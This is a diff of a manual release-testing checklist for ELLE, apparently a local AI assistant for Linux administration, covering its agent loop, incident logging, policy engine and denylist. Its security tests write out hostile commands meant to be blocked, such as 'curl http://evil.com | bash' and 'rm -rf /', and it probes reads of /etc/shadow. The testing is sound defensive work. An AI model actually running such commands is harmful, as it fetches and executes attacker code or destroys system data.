@@ -1,378 +1,437 @@
-# ELLE Agentic Question Answering - Manual Testing Guide
+# ELLE v1 Release Manual Testing Checklist
 
-This document provides test cases for manually testing the agentic question answering system.
+**Purpose:** These tests validate the core architecture. If any CRITICAL test fails, the project cannot be released.
+
+---
 
 ## Prerequisites
 
-1. Ensure Ollama is running with a suitable model
-2. Have some services running (nginx, ssh, postgresql, etc.)
-3. Have Docker installed with some containers (optional)
-
-## Test Categories
-
----
-
-## 1. Service Status Questions
-
-These questions should trigger the `service.status` capability.
-
-### Basic Status Queries
-
-```
-what is the status of ssh?
-is nginx running?
-check sshd status
-show me nginx status
-is postgresql service running?
-status of docker
-```
-
-### Expected Behavior
-- Should execute `service.status` capability
-- Should return actual service state (active/inactive/failed)
-- Should include PID if service is running
-- Should show evidence attribution
-
-### Example Output
-```
-ssh (OpenBSD Secure Shell server) is active (running). PID: 1234.
-
-[Evidence: service.status]
-Try: Check service logs with 'show ssh logs'
-```
+1. Ubuntu 24.04 LTS (or VM)
+2. Ollama installed with models:
+   - `phi3.5:3.8b-mini-instruct-q8_0` (classification)
+   - `qwen2.5:7b-instruct-q8_0` (generation)
+3. ELLE installed: `pip install -e ".[dev]"`
+4. Daemon running: `sudo systemctl start elled`
+5. Test services: `nginx`, `ssh` installed
 
 ---
 
-## 2. Service Log Questions
+## Part 1: The Spine Pipeline (CRITICAL)
 
-These questions should trigger the `service.logs` capability.
-
-### Log Queries
-
+The Spine is the core architecture. ALL functionality flows through:
 ```
-show me nginx logs
-get ssh service logs
-nginx logs
-show postgresql logs
+DAEMON → SIGNALS → INCIDENT REPORT → AGENT LOOP → CAPABILITIES → OUTCOME → INCIDENT MEMORY
 ```
 
-### Expected Behavior
-- Should execute `service.logs` capability
-- Should return recent journal entries
-- Should include timestamps
+### Test 1.1: End-to-End Spine Flow
+
+**Action:**
+```bash
+elle "restart nginx"
+```
+
+**Verify:**
+1. [ ] Intent classified as `system_task`
+2. [ ] Agent loop starts (check logs for "Starting agentic loop")
+3. [ ] Capability `service.restart` is called (not raw `systemctl`)
+4. [ ] Incident created in vault:
+   ```bash
+   sqlite3 /var/lib/elle/incidents.db "SELECT incident_id, title, status FROM incidents ORDER BY created_at DESC LIMIT 1"
+   ```
+5. [ ] Incident contains action record:
+   ```bash
+   sqlite3 /var/lib/elle/incidents.db "SELECT command, success FROM actions WHERE incident_id = '<id>'"
+   ```
+
+**Pass Criteria:** Incident record exists with capability action. Service actually restarted.
 
 ---
 
-## 3. File Content Questions
+### Test 1.2: Incident Recording on All Operations
 
-These questions should trigger the `file.read` capability.
-
-### File Queries
-
-```
-what's in /etc/hosts?
-show me /etc/hostname
-read /etc/os-release
-cat /etc/passwd
-display /etc/resolv.conf
-what is in /etc/fstab?
+**Action:**
+```bash
+elle "read /etc/hostname"
+elle "what's in /etc/hosts?"
+elle "show nginx status"
 ```
 
-### Expected Behavior
-- Should execute `file.read` capability
-- Should return file contents
-- Should handle file not found gracefully
+**Verify:**
+```bash
+sqlite3 /var/lib/elle/incidents.db "SELECT COUNT(*) FROM incidents WHERE created_at > datetime('now', '-5 minutes')"
+```
+
+**Pass Criteria:** At least 3 new incidents created. Each has action records.
 
 ---
 
-## 4. Package Information Questions
+### Test 1.3: Capability Execution (Not Shell Bypass)
 
-These questions should trigger the `package.info` capability.
-
-### Package Queries
-
-```
-is docker installed?
-is nginx installed?
-what version of python3 do I have?
-python3 version?
-is git installed?
-show me curl package info
+**Action:**
+```bash
+elle "restart ssh"
 ```
 
-### Expected Behavior
-- Should execute `package.info` capability
-- Should return installed status and version
-- Should handle not-installed packages
+**Verify in logs or incident:**
+- [ ] Executed via `service.restart` capability
+- [ ] NOT via raw `systemctl restart ssh` shell command
+- [ ] Policy check occurred (check for "PolicyEngine" in debug logs)
 
-### Example Output
+**Pass Criteria:** All mutations flow through CapabilityExecutor, not subprocess.
+
+---
+
+## Part 2: The Three Pillars (CRITICAL)
+
+### Pillar 1: Daemon Owns Telemetry
+
+**Test 2.1: Daemon Health Check**
+
+**Action:**
+```bash
+curl http://localhost:8642/health
 ```
-nginx is installed (version 1.24.0-1ubuntu1).
 
-[Evidence: package.info]
-Try: Install the package with '/do install nginx'
+**Pass Criteria:** Returns `{"status": "healthy"}` or similar.
+
+---
+
+**Test 2.2: Telemetry Collection**
+
+**Action:**
+```bash
+# Trigger an event (restart a service)
+sudo systemctl restart nginx
+
+# Wait 5 seconds, then check
+elle status
+```
+
+**Verify:**
+- [ ] Daemon detected service state change
+- [ ] Event appears in daemon logs or telemetry
+
+---
+
+### Pillar 2: Capabilities Are the Only Mutation Path
+
+**Test 2.3: Capability Registry**
+
+**Action:**
+```bash
+elle "what capabilities are available?"
+# Or directly:
+python3 -c "from elle.capabilities.registry import get_registry; print([c.spec.name for c in get_registry().list_all()])"
+```
+
+**Pass Criteria:** Lists capabilities including `service.restart`, `file.read`, `docker.list`.
+
+---
+
+**Test 2.4: Policy Enforcement**
+
+**Action:**
+```bash
+elle "delete /etc/passwd"
+```
+
+**Verify:**
+- [ ] Operation BLOCKED by policy
+- [ ] Error message mentions policy denial
+- [ ] No actual modification to /etc/passwd
+
+**Pass Criteria:** Policy engine blocks dangerous operations.
+
+---
+
+### Pillar 3: Agent Loop Orchestrates
+
+**Test 2.5: Agent Loop with Context Retrieval**
+
+**Action:**
+```bash
+elle "why might nginx be failing?"
+```
+
+**Verify:**
+- [ ] Man Vault searched (check logs for "search_man_vault")
+- [ ] Incident Vault searched (check logs for "search_incidents")
+- [ ] Response is grounded in retrieved context (not pure hallucination)
+
+**Pass Criteria:** Agent loop retrieves context before generating response.
+
+---
+
+**Test 2.6: Multi-Turn Tool Usage**
+
+**Action:**
+```bash
+elle "check if nginx is running and show its config"
+```
+
+**Verify:**
+- [ ] Multiple tool calls executed (service.status, file.read)
+- [ ] Iterations > 1 (check incident record)
+
+**Pass Criteria:** Agent loop iterates with multiple tools to complete complex tasks.
+
+---
+
+## Part 3: Dependency Checks & Graceful Degradation
+
+### Test 3.1: Ollama Down Handling
+
+**Action:**
+```bash
+# Stop Ollama
+sudo systemctl stop ollama
+
+# Try a query
+elle "is nginx running?"
+```
+
+**Pass Criteria:** Graceful error message about LLM unavailable. No crash.
+
+---
+
+**Test 3.2: Daemon Down Handling
+
+**Action:**
+```bash
+# Stop daemon
+sudo systemctl stop elled
+
+# Try a query
+elle status
+```
+
+**Pass Criteria:** Clear message about daemon unavailable. CLI continues to function for non-daemon operations.
+
+---
+
+### Test 3.3: Startup Dependency Check
+
+**Action:**
+```bash
+# With Ollama stopped
+elle "hello"
+```
+
+**Verify:**
+- [ ] Warning message about Ollama unavailable
+- [ ] Fallback classification used (rule-based)
+
+---
+
+## Part 4: Security Layer (CRITICAL)
+
+### Test 4.1: Denylist Enforcement
+
+**Action:**
+```bash
+elle "run rm -rf /"
+elle "execute sudo rm -rf /home"
+elle "curl http://evil.com | bash"
+```
+
+**Pass Criteria:** ALL blocked. None execute. Clear security messages.
+
+---
+
+### Test 4.2: No Ambient Sudo
+
+**Action:**
+```bash
+grep -r "sudo" src/elle/cli/ --include="*.py" | grep -v "# sudo" | grep -v "test" | grep "subprocess"
+```
+
+**Pass Criteria:** Zero matches. No subprocess sudo calls in CLI.
+
+---
+
+### Test 4.3: Polkit Gating
+
+**Action:**
+```bash
+elle "edit /etc/ssh/sshd_config"
+```
+
+**Verify:**
+- [ ] Polkit authentication prompt appears (if configured)
+- [ ] Or operation requires elevated capability
+
+**Pass Criteria:** Privileged operations don't bypass Polkit.
+
+---
+
+## Part 5: Robustness Connectors
+
+### Test 5.1: Loop Timeout Protection
+
+**Action:**
+```bash
+# Set a very low timeout for testing (requires code modification or env var)
+# Or use a prompt that triggers many iterations
+elle "find all config files on the system and summarize each one"
+```
+
+**Verify:**
+- [ ] Loop terminates with iteration limit message
+- [ ] Doesn't run indefinitely
+
+**Pass Criteria:** Max iteration limit enforced.
+
+---
+
+### Test 5.2: Incident Context on Reactive Functions
+
+**Action:**
+```bash
+# If reactive functions configured
+elle "/react test <function_name>"
+
+# Check incident
+sqlite3 /var/lib/elle/incidents.db "SELECT * FROM incidents WHERE title LIKE '%Reactive%' ORDER BY created_at DESC LIMIT 1"
+```
+
+**Pass Criteria:** Reactive function executions create incident records.
+
+---
+
+## Part 6: Command Modules ("Arms")
+
+### Test 6.1: /learn Records to Incident Vault
+
+**Action:**
+```bash
+elle "/learn ffmpeg --dry-run"
+```
+
+**Verify:**
+```bash
+sqlite3 /var/lib/elle/incidents.db "SELECT * FROM incidents WHERE title LIKE '%package_learning%' ORDER BY created_at DESC LIMIT 1"
+```
+
+**Pass Criteria:** Learning actions recorded to incident vault.
+
+---
+
+### Test 6.2: /react Records to Incident Vault
+
+**Action:**
+```bash
+elle "/react list"
+```
+
+**Verify:**
+```bash
+sqlite3 /var/lib/elle/incidents.db "SELECT * FROM incidents WHERE title LIKE '%reactive%' OR domain = 'service' ORDER BY created_at DESC LIMIT 3"
 ```
 
 ---
 
-## 5. Docker Container Questions
+## Part 7: Data Persistence
 
-These questions should trigger docker capabilities.
+### Test 7.1: Database Accessibility
 
-### Container List Queries
+**Action:**
+```bash
+# Check all databases exist and are accessible
+ls -la /var/lib/elle/*.db
 
-```
-what containers are running?
-docker containers
-show me all containers
-list docker containers
-```
-
-### Container Status Queries
-
-```
-status of the postgres container
-myapp container status
-is the redis container running?
+# Verify schemas
+sqlite3 /var/lib/elle/incidents.db ".schema incidents"
+sqlite3 /var/lib/elle/manvault.db ".schema"
 ```
 
-### Container Log Queries
-
-```
-show postgres container logs
-get myapp logs
-docker logs for redis
-```
-
-### Expected Behavior
-- Should execute appropriate docker capability
-- Should list containers with status
-- Should handle Docker not installed gracefully
+**Pass Criteria:** All databases exist with correct schemas.
 
 ---
 
-## 6. Network Questions
+### Test 7.2: Incident History Query
 
-These questions should trigger network capabilities.
-
-### Listener Queries
-
-```
-what's listening on the ports?
-show me listening ports
-what ports are open?
-show all listening services
+**Action:**
+```bash
+elle "show me recent incidents"
+# Or
+elle incident list
 ```
 
-### Port-Specific Queries
-
-```
-what's on port 80?
-who is using port 8080?
-what's listening on port 443?
-port 22 status
-```
-
-### Expected Behavior
-- Should execute `network.listeners` capability
-- Should show process names and ports
-- Should include protocol (tcp/udp)
-
-### Example Output
-```
-Listening ports:
-State    Recv-Q   Send-Q   Local Address:Port   Peer Address:Port   Process
-LISTEN   0        128      0.0.0.0:22           0.0.0.0:*           sshd
-LISTEN   0        511      0.0.0.0:80           0.0.0.0:*           nginx
-
-[Evidence: network.listeners]
-```
+**Pass Criteria:** Returns list of past incidents with summaries.
 
 ---
 
-## 7. System Information Questions
+## Release Blocker Summary
 
-These questions should trigger system capabilities.
-
-### System Info Queries
-
-```
-show me system info
-what system is this?
-system information
-```
-
-### Resource Queries
-
-```
-how much memory is being used?
-disk usage
-system resources
-cpu usage
-show memory usage
-how much disk space is left?
-system load
-uptime
-```
-
-### Expected Behavior
-- Should execute appropriate system capability
-- Should show memory/disk/CPU information
-- Should be human-readable
+| Test | Category | Blocking? |
+|------|----------|-----------|
+| 1.1 | Spine Pipeline | CRITICAL |
+| 1.2 | Incident Recording | CRITICAL |
+| 1.3 | Capability Execution | CRITICAL |
+| 2.1 | Daemon Health | CRITICAL |
+| 2.4 | Policy Enforcement | CRITICAL |
+| 4.1 | Denylist | CRITICAL |
+| 4.2 | No Ambient Sudo | CRITICAL |
+| 3.1 | Ollama Down | HIGH |
+| 3.2 | Daemon Down | HIGH |
+| 5.1 | Loop Timeout | HIGH |
+| 2.5 | Context Retrieval | MEDIUM |
+| 6.1 | Arms Recording | MEDIUM |
 
 ---
 
-## 8. Fallback to LLM Questions
+## Quick Smoke Test (5 Minutes)
 
-These questions should NOT trigger agentic handling and should fall back to pure LLM.
+Run these before any release:
 
-### General Questions (No System State)
+```bash
+# 1. Basic query with capability (must create incident)
+elle "is nginx running?"
 
+# 2. Mutation through capability (must use CapabilityExecutor)
+elle "restart nginx"
+
+# 3. Security block (must be denied)
+elle "run sudo rm -rf /"
+
+# 4. Check incidents recorded
+sqlite3 /var/lib/elle/incidents.db "SELECT COUNT(*) FROM incidents WHERE created_at > datetime('now', '-10 minutes')"
+# Should be >= 2
+
+# 5. Verify nginx actually restarted
+systemctl status nginx | grep "Active: active"
 ```
-what is Linux?
-how do I create a bash script?
-explain the difference between TCP and UDP
-what does chmod do?
-how do I set up a cron job?
-```
 
-### Expected Behavior
-- Should NOT show evidence attribution
-- Should use pure LLM response
-- Should provide helpful explanations
+If all 5 pass, the core architecture is functional.
 
 ---
 
-## 9. Edge Cases
+## Failure Investigation
 
-### Nonexistent Services
+### Incident Not Created
 
-```
-is fakeservice123 running?
-status of nonexistent-daemon
-```
+1. Check `incident_recorder.py` is being called
+2. Verify database is writable: `touch /var/lib/elle/test && rm /var/lib/elle/test`
+3. Check for exceptions in logs
 
-### Expected Behavior
-- Should handle gracefully
-- Should report service not found or inactive
+### Capability Not Used
 
-### Permission Issues
+1. Verify `CapabilityExecutor` in call stack
+2. Check `tools.py` routes to `execute_capability`
+3. Confirm capability is registered: `python3 -c "from elle.capabilities.registry import get_registry; print(get_registry().get('service.restart'))"`
 
-```
-what's in /etc/shadow?
-read /root/.bashrc
-```
+### Security Bypass
 
-### Expected Behavior
-- Should report permission denied
-- Should not crash
-
-### Invalid Paths
-
-```
-what's in /this/path/does/not/exist?
-```
-
-### Expected Behavior
-- Should report file not found
-- Should suggest alternatives or ask for clarification
+1. Check `subprocess_runner.py` denylist patterns
+2. Verify policy engine loaded defaults
+3. Check for hardcoded subprocess calls bypassing safety
 
 ---
 
-## 10. Combined/Complex Questions
+## Sign-Off
 
-These may require multiple capabilities or may not be fully supported yet.
+| Tester | Date | All Critical Pass? | Notes |
+|--------|------|-------------------|-------|
+| | | [ ] Yes [ ] No | |
 
-```
-is nginx running and what port is it on?
-show nginx status and recent errors
-```
-
-### Expected Behavior
-- May only answer part of the question
-- Should indicate if some information is missing
-
----
-
-## Test Flow Checklist
-
-### Quick Smoke Test
-
-1. [ ] `is ssh running?` - Should show service status
-2. [ ] `what's in /etc/hostname?` - Should show file content
-3. [ ] `is git installed?` - Should show package info
-4. [ ] `what ports are open?` - Should list listeners
-5. [ ] `how much memory is being used?` - Should show resources
-
-### Full Test Suite
-
-#### Services
-- [ ] Status query for running service
-- [ ] Status query for stopped service
-- [ ] Status query for nonexistent service
-- [ ] Log query for service with logs
-- [ ] Log query for service without logs
-
-#### Files
-- [ ] Read existing file
-- [ ] Read nonexistent file
-- [ ] Read file without permission
-
-#### Packages
-- [ ] Query installed package
-- [ ] Query not-installed package
-- [ ] Query version of package
-
-#### Docker (if available)
-- [ ] List containers
-- [ ] Status of specific container
-- [ ] Logs of container
-
-#### Network
-- [ ] List all listeners
-- [ ] Query specific port (used)
-- [ ] Query specific port (unused)
-
-#### System
-- [ ] System info
-- [ ] Memory usage
-- [ ] Disk usage
-
-#### Fallback
-- [ ] General Linux question (should use LLM only)
-
----
-
-## Troubleshooting
-
-### No Evidence Shown
-
-If questions aren't being handled agentically:
-1. Check if the question matches a known pattern
-2. Try rephrasing using keywords like "status", "running", "installed"
-3. Check logs for pattern matching failures
-
-### Capability Execution Fails
-
-If capabilities fail to execute:
-1. Check if the required tools are installed (systemctl, dpkg, docker, ss)
-2. Check permissions
-3. Check daemon connectivity (if using daemon capabilities)
-
-### LLM Not Available
-
-If seeing "LLM not available":
-1. Ensure Ollama is running: `systemctl status ollama`
-2. Check model is loaded: `ollama list`
-3. Try warming up the model: `ollama run qwen2.5:7b-instruct-q8_0 "hello"`
-
----
-
-## Reporting Issues
-
-When reporting issues, include:
-1. The exact question asked
-2. The response received
-3. What you expected
-4. System details (Ubuntu version, services available)
-5. Any error messages from logs
+**Release authorized only when all CRITICAL tests pass.**
